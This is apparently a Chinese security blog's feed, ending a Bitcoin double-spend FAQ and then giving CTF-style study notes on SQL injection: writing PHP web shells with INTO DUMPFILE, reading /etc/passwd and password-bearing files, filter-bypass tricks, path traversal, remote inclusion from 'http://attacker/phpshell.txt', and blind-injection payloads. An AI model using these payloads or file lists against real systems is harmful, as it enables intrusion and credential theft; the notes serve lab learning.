<h4 id="Q4-如何实现双重支付-？"><a href="#Q4-如何实现双重支付-？" class="headerlink" title="Q4. 如何实现双重支付 ？"></a>Q4. 如何实现双重支付 ？</h4><p>在目前公认的数据链上完成交易确认，然后延续另一条数据链，使之成为新的被公认的数据链，则原来被公认的数据块的交易不被承认，在交易重新被认可之前，抢先完成同一笔钱的另一个交易确认，这笔交易就会因为账单中指定地方的钱已经被使用了而作废，但是对方的交易物品已经发送。<br>比如：挖到新的BLOCK不广播，比特币消费给A，继续挖，抢先到达2个区块，前后广播，所有人会以你这个更长的分支为当前的数据链。A收到的比特币不被承认，再消费一次比特币，关于A的账单因为比特币不足作废。<br>解决办法：收款人不要在交易确认后（及产生一个新的区块后）立刻发出货物（实现交易），而是应该在看一段时间，等待基于这个区块的新生成的区块达到6个，并且之前的账簿没有被取消，才确认钱已经到账（你的交易所在的区块链足够强壮）。<br>当整个网络算力足够高，攻击概率极低，或成本极大。</p>
<h4 id="Q4-难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？"><a href="#Q4-难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？" class="headerlink" title="Q4. 难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？"></a>Q4. 难度是节点自己自动调控的，是否可以人为利用低难度去产生长分支区块？</h4><p>客户端接受“最长”块链作为有效链，整条块链的“长度”是指具有最大难度的链，而不是指具有最多区块数量的块链，可防止某些人创建大量低难度区块，故意使块链分叉，并且让网络接受它成为“最长”的块链。</p>
<h4 id="Q5-？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？"><a href="#Q5-？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？" class="headerlink" title="Q5. ？？？矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换？？？"></a>Q5. <strong>？？？</strong>矿工节点会在先收到的区块上继续挖矿，还是根据区块头中的时间戳来替换<strong>？？？</strong></h4><p>这个问题不是很确定，个人觉得是在先收到的区块上挖矿。这样子对于矿工工作合理一些，但是如此区块头中的时间戳貌似用处也不大。</p>
<h4 id="Q5-？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？"><a href="#Q5-？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？" class="headerlink" title="Q5. ？？？区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash？？？"></a>Q5. <strong>？？？</strong>区块头中上一个区块的hash，是上一个区块全部的hash还是上一个区块头的hash<strong>？？？</strong></h4><p>也不是很确定，说两者的都有，个人觉得是上一个区块头的hash，因为区块头包括交易的merkle树的根，已经做到与交易绑定。</p>
<p>参考：<br>《比特币开发》——申屠青春<br><a href="https://www.jianshu.com/p/b8a0c43d0176" target="_blank" rel="external">比特币:交易的数据结构-姜家志</a><br><a href="https://www.liaoxuefeng.com/article/001482718603696a6b6eb2bebc74211ab967146a952ae0c000" target="_blank" rel="external">深入理解比特币交易的脚本</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> 比特币 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL文件操作]]></title>
      <url>/2017/12/05/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— sql文件操作及过滤 —<br><a id="more"></a></p>
<h2 id="SQL文件操作"><a href="#SQL文件操作" class="headerlink" title="SQL文件操作"></a>SQL文件操作</h2><p>以下windows操作可以在phpstudy的dvwa上复现，linux操作可以在Metasploitable2的dvwa上复现。</p>
<h3 id="读取文件-load-file"><a href="#读取文件-load-file" class="headerlink" title="读取文件 load_file"></a>读取文件 load_file</h3><p>读取文件前提：</p>
<ul>
<li>文件必须位于服务器主机上</li>
<li>必须指定完整路径的文件</li>
<li>必须有FILE权限 </li>
<li>文件内容必须小于max_allowed_packet （show VARIABLES like ‘%max_allowed_packet%’; 查看）</li>
</ul>
<p>使用格式：<strong>load_file(‘路径’)</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#windows</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'d:/kali.txt'</span>)             #路径为单引号<span class="keyword">Str</span>，斜杠是/而不是\</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x643a2f6b616c692e747874</span>)  #路径为<span class="number">0x16</span>进制<span class="keyword">Str</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98.</span>...))     #路径为<span class="built_in">char</span>转换的字符</div><div class="line">#linux</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>（<span class="string">'/etc/passwd'</span>）</div></pre></td></tr></table></figure></p>
<p><strong>关于过滤：</strong><br>防止文件中有截断：hex(load_file(‘文件地址’))</p>
<h3 id="写入文件-INTO-DUMPFILE"><a href="#写入文件-INTO-DUMPFILE" class="headerlink" title="写入文件 INTO DUMPFILE"></a>写入文件 INTO DUMPFILE</h3><p>使用格式：<strong>“内容” INTO DUMPFILE “路径”</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#windows</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php system($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"D:/PHP/WWW/cmd.php"</span></div><div class="line">#linux</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/var/www/a.php"</span>  </div><div class="line"> #下一条默认保存在/<span class="keyword">var</span>/lib/mysql/dvwa/a.php （默认保存路径根据系统用户而定）</div><div class="line"> #（/<span class="keyword">var</span>/lib/mysql 是 mysql的主目录，dvwa是<span class="keyword">SQL</span>注入漏洞的网站主目录）</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"a.php"</span>       </div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/tmp/a.php"</span></div></pre></td></tr></table></figure></p>
<p>因为Linux用户之间的读取，写入，执行权限严格。<br>假设做数据库写入文件操作的用户为MYSQL，而网站目录的用户为WWW。</p>
<ul>
<li>第一种情况，mysql用户不能往WWW用户的目录写入文件，我们就无法访问木马文件，从而不能利用。写入无效。</li>
<li>第二种情况，dvwa目录只有mysql用户和root有权限，www无法进入读写，所以mysql植入木马，www网站也没有权限访问木马。写入成功，执行无效</li>
<li>第三种情况，tmp目录为所有用户都可以访问的目录（mysql 可以写入，www 可以读出），此时www用户通过文件包含漏洞去“执行”木马<br>ps.(文件包含漏洞是读取文件进来执行，不是真正的需要对文件执行权限)</li>
</ul>
<p>此外，还可以查询数据存至目标主机，再加以利用<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/tmp/a.db'</span></div></pre></td></tr></table></figure></p>
<p><strong>关于过滤：</strong><br>文件转为16进制（INTO DUMPFILE会自动变为正常字符保存）<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat php-reverse-shell.php | xxd -ps     </div><div class="line">#用xxd进行16进制显示，但是每一行长固定，后面有换行符，sql无法翻译</div><div class="line">cat php-reverse-shell.php | xxd -ps | tr -d '\n'    用xxd进行16进制显示，删除换行符</div><div class="line">ps. php-reverse-shell.php 木马文件太大 url长度限制 无法上传 可换小型php木马</div><div class="line">	' union <span class="keyword">select</span> <span class="literal">null</span>,(空格)(<span class="number">0xcccccc</span>) <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/tmp/1.php"</span> <span class="comment">--+</span></div><div class="line">ps. 注意 文件<span class="number">16</span>进制编码填入cccccc</div></pre></td></tr></table></figure></p>
<h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#查看系统版本</div><div class="line">    c:/boot.ini</div><div class="line">#php配置信息</div><div class="line">    c:/windows/php.ini</div><div class="line">#MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</div><div class="line">    c:/windows/my.ini</div><div class="line">    c:/winnt/php.ini</div><div class="line">    c:/winnt/my.ini</div><div class="line">#存储了mysql.user表中的数据库连接密码</div><div class="line">    c:\mysql\data\mysql\user.MYD </div><div class="line">#存储了虚拟主机网站路径和密码</div><div class="line">    c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini </div><div class="line">    c:\Program Files\Serv-U\ServUDaemon.ini</div><div class="line">#查看IIS的虚拟主机配置</div><div class="line">    c:\windows\system32\inetsrv\MetaBase.xml </div><div class="line">#存储了WINDOWS系统初次安装的密码</div><div class="line">    c:\windows\repair\sam </div><div class="line">#6.0版本以前的serv-u管理员密码存储于此</div><div class="line">    c:\Program Files\ Serv-U\ServUAdmin.exe </div><div class="line">    c:\Program Files\RhinoSoft.com\ServUDaemon.exe</div><div class="line">#存储了pcAnywhere的登陆密码</div><div class="line">    C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</div><div class="line">#查看WINDOWS系统apache文件</div><div class="line">    c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</div><div class="line">#查看jsp开发的网站 resin文件配置信息.</div><div class="line">    c:/Resin-3.0.14/conf/resin.conf </div><div class="line">#查看linux系统配置的JSP虚拟主机</div><div class="line">    c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf </div><div class="line">    d:\APACHE\Apache2\conf\httpd.conf</div><div class="line">    C:\Program Files\mysql\my.ini</div><div class="line">#存在MYSQL系统中的用户密码</div><div class="line">    C:\mysql\data\mysql\user.MYD</div></pre></td></tr></table></figure>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">#apache2缺省配置文件</div><div class="line">    /usr/local/app/apache2/conf/httpd.conf </div><div class="line">    /usr/local/apache2/conf/httpd.conf</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini </div><div class="line">#从中得到防火墙规则策略</div><div class="line">    /etc/sysconfig/iptables </div><div class="line">#apache配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf</div><div class="line">#同步程序配置文件</div><div class="line">    /etc/rsyncd.conf </div><div class="line">#mysql的配置文件</div><div class="line">    /etc/my.cnf </div><div class="line">#系统版本</div><div class="line">    /etc/redhat-release </div><div class="line">    /etc/issue</div><div class="line">    /etc/issue.net</div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf</div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf </div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf </div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf</div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的绕过]]></title>
      <url>/2017/10/19/WEB-CTF%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— sql，上传，目录  —<br><a id="more"></a></p>
<hr>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li>url base64 utf-8… (全部编码或个别编码)</li>
<li>字符–&gt;char()<br><code>SELECT FROM Users WHERE username = CHAR(101,97,115,116)</code></li>
<li>hex<br><code>SELECT password FROM Users WHERE username = 0x61646D696E</code></li>
<li>%2527 -&gt; %27 -&gt; ‘ (绕过magic_quotes_gpc对于’的加/过滤，特定情况可以用吧)</li>
</ul>
<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
<li>两个空格代替一个空格，TAB代替空格</li>
<li>用注释符号代替空格 /<em>*/ /</em>.1<em>/ /</em>ddd*/ (ddd为无意义的字母)</li>
<li>用括号代替空格  ()</li>
<li>用+代替空格  </li>
<li>%0a %a0 %20  %09  %0B %0C %0D </li>
<li>用花括号代替空格 {}</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#()</div><div class="line"><span class="keyword">select</span>(<span class="number">1</span>)</div><div class="line">#利用函数完成猜解  如：  猜解<span class="keyword">user</span>()第二个字符的<span class="keyword">ascii</span>码是不是<span class="number">109</span>，若是<span class="number">109</span>，则页面加载将延迟</div><div class="line"><span class="keyword">http</span>://www.xxx.com/index.php?<span class="keyword">id</span>=(<span class="keyword">sleep</span>(<span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">2</span>)<span class="keyword">for</span>(<span class="number">1</span>)))=<span class="number">109</span>))</div><div class="line"># <span class="string">' "</span></div><div class="line"><span class="string">select'</span><span class="number">1</span><span class="string">'</span></div><div class="line"><span class="string">select"1"</span></div><div class="line"><span class="string"># &#123;&#125;</span></div><div class="line"><span class="string">select&#123;1&#125;</span></div></pre></td></tr></table></figure>
<ul>
<li>+代替空格  不是url编码空格的+而是直接的+ <code>select+user()</code></li>
<li>单引号双引号代替空格  </li>
</ul>
<h3 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a>过滤information_schema.tables等关键表名</h3><ul>
<li><code>select table_name from mysql.innodb_table</code> 不清楚何时起作用，起码我的mysql中没有innodb_table这个表</li>
<li>information_schema . tables<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg" alt=""></li>
<li>/<em>!50000information_schema.tables</em>/</li>
<li>尝试其他也包含库表信息的表<code>information_schema.key_column_usage/partitions/statistics/table_constraints</code></li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
<li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
<li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
<li>substring(flag,1,1)in(‘a’) / substring(flag,1,1)in(0x97)</li>
</ul>
<h3 id="Mysql条件注释的利用"><a href="#Mysql条件注释的利用" class="headerlink" title="Mysql条件注释的利用  /*! ... */"></a>Mysql条件注释的利用  <code>/*! ... */</code></h3><ul>
<li><code>/*! ... */</code>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
<li><code>/*!50000select*/</code>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
<li><code>/*/* ... */</code></li>
</ul>
<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
<li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
<li>substr() mid()等函数中的<strong>,</strong> ：<code>select substr(database() from 1 for 1);</code></li>
</ul>
<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用十六进制可以绕过引号<br>如：”users” —&gt; 0x7573657273</p>
<h3 id="过滤-lt-与-gt"><a href="#过滤-lt-与-gt" class="headerlink" title="过滤&lt;与&gt;"></a>过滤&lt;与&gt;</h3><p>使用<a href="http://www.yiibai.com/sql/sql_function_greatest.html" target="_blank" rel="external">GREATEST()</a>绕过比较操作符。<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code> ——-&gt;<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(10000000,sha(1)) 1000次sha(1)，来时间延迟  </p>
<h3 id="sleep中不能使用数字"><a href="#sleep中不能使用数字" class="headerlink" title="sleep中不能使用数字"></a>sleep中不能使用数字</h3><p>用pi()函数绕过<br><code>sleep(ceil(pi()))</code></p>
<h3 id="过滤注释符号（-，–）"><a href="#过滤注释符号（-，–）" class="headerlink" title="过滤注释符号（#，–）"></a>过滤注释符号（#，–）</h3><ul>
<li>id=1’ union select 1,2,3||’1</li>
<li>id=1’ union select 1,2,’3</li>
</ul>
<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>尝试宽字节    %bf%27 %df%27 %aa%27</p>
<h3 id="过滤order-by"><a href="#过滤order-by" class="headerlink" title="过滤order by"></a>过滤order by</h3><p>当order by 被过滤后就可以使用into 变量来绕过<br><code>select * from yz limit 1,1 into @a,@b,@c;</code></p>
<h3 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h3><ul>
<li>hex()、bin() ==&gt; ascii()</li>
<li>sleep() ==&gt; benchmark()</li>
<li>concat_ws()==&gt; group_concat()</li>
<li>mid()、substr() ==&gt; substring()</li>
<li>@@user ==&gt; user()</li>
<li>@@datadir ==&gt; datadir()</li>
</ul>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
<ul>
<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
<li>文件类型限制     burpsuite 修改image/jpeg</li>
<li>文件大小限制     修改信息文件限制大小参数</li>
<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
</ul>
<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd././././././././././././././</code><br><code>////////////////////////passwd//////////////////////</code></p>
<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
<p>以上偷取葛大佬的部分栗子</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的sql盲注]]></title>
      <url>/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—<br>—requests和脚本—<br><a id="more"></a></p>
<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇包括sql盲注，以及调用requests库的基本python脚本编写</p>
<h2 id="sql盲注的原理"><a href="#sql盲注的原理" class="headerlink" title="sql盲注的原理"></a>sql盲注的原理</h2><p>上篇也大致提了一下sql盲注，以及分为<strong>布尔型盲注</strong>,<strong>时间型盲注</strong>。<br>实际上sql盲注也很简单，其实就是不直接显示搜索到的结果，而从其他方式来推断得出结果的sql注入。<br>举起个小栗子：</p>
<ul>
<li><strong>sql回显注入</strong> ：<br>  我问你叫什么名字，你回答你叫奥特曼。</li>
<li><strong>sql布尔型盲注</strong> ：<br>  我问你叫什么名字，你只会说是和不是(ture false)。<br>  于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。<br>  但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。</li>
<li><strong>sql时间型盲注</strong> ：<br>  我问你叫什么名字，无论对错，你只会 啊 的叫一声。<br>  于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。</li>
</ul>
<p>再类比成数据库查询，原理就是如此了。</p>
<h2 id="数据库盲注所用的函数"><a href="#数据库盲注所用的函数" class="headerlink" title="数据库盲注所用的函数"></a>数据库盲注所用的函数</h2><ul>
<li><a href="http://outofmemory.cn/code-snippet/1149/MySQL-if-case-statement-usage-summary" target="_blank" rel="external">if 和 case</a> 用于时间型盲注</li>
<li><a href="http://www.jb51.net/article/27458.htm" target="_blank" rel="external">substring()</a> 用于截断字符串</li>
<li><a href="http://www.bkjia.com/Mysql/625204.html" target="_blank" rel="external">ascii（）</a> 使字符变成ascii码（可以ascii码比较，也可直接字符比较）</li>
<li><a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset 与 limit</a> 用于查询到多条记录时选取第几条，再猜取内容，不然只会猜取第一条</li>
</ul>
<h2 id="sql盲注的步骤"><a href="#sql盲注的步骤" class="headerlink" title="sql盲注的步骤"></a>sql盲注的步骤</h2><h3 id="1-判断是否有盲注点"><a href="#1-判断是否有盲注点" class="headerlink" title="1.判断是否有盲注点"></a>1.判断是否有盲注点</h3><p><strong>布尔型盲注</strong>：布尔型盲注的注入点的表现并不绝对统一，只要当sql语句执行成功和失败的返回的页面存在某种固定差异，即存在布尔型盲注点。<br>所以可以尝试但不限于以下的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$name= 1' and '1' = '1    (前后闭合’‘，此处应该返回true的页面，即与$name=1一样)</div><div class="line"></div><div class="line">$name= 1' and '1' = '2    (前后闭合’‘, 此处应该返回false的信息，即与$name=1不同)</div><div class="line"></div><div class="line">$name= 1' or '1' = '1    (前后闭合’‘，此处应该返回true的页面，即与$name=1一样)</div><div class="line"></div><div class="line">$name= 1' or '1' = '2    (前后闭合’‘, 此处应该返回false的信息，即与$name=1不同)</div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> 列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p><strong>时间型盲注</strong>:基于布尔型的语句上，利用if或case加以区分使返回结果有区别<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$name= ' or if('1' = '1',sleep(5),1) <span class="comment">--+   (延迟返回为true)</span></div><div class="line"></div><div class="line">$name= ' or if（'1' = '2',sleep(5),1) <span class="comment">--+  (不延迟返回为false，因为正确的概率低，节省时间)</span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> 列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="string">'1'</span> = <span class="string">'1'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></div></pre></td></tr></table></figure></p>
<p>此处跟布尔型<strong>and</strong>和<strong>or</strong>的使用故意有所区分。<br>实际情况中当你构造不出一个数据库中有的name时，如果继续使用<code>$name= &#39; and if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<p><code>$name=&#39;&#39;</code> 语句执行已经为false，根据<strong>and的就近原则</strong>：当前有false时，不执行之后的句子<br>结果将永远不延迟。</p>
<p>于是就可以用<code>&#39; or if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<hr>
<p>接下来<br>一般跳过<strong>判断select语句有几列</strong>，<strong>判断显示的信息在第几列</strong>环节，<br>因为盲注一般不用union select查询，并且没有显示信息。</p>
<h3 id="2-利用函数来搜集信息"><a href="#2-利用函数来搜集信息" class="headerlink" title="2.利用函数来搜集信息"></a>2.利用函数来搜集信息</h3><p>用户：user()<br>当前数据库：database()<br>数据库版本：version()<br>@@hostname （用户）<br>@@datadir   (数据库在文件的位置)<br>@@version  （版本)<br>@@version_compile_OS  (操作系统版本)</p>
<p><strong>布尔型:</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=' or <span class="keyword">select</span> <span class="keyword">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) =<span class="string">'r'</span> <span class="comment">--+  #截取第一位开始的一个</span></div><div class="line"></div><div class="line">全局：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">or</span> <span class="keyword">select</span> <span class="keyword">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) =<span class="string">'r'</span> <span class="comment">--+'</span></div></pre></td></tr></table></figure></p>
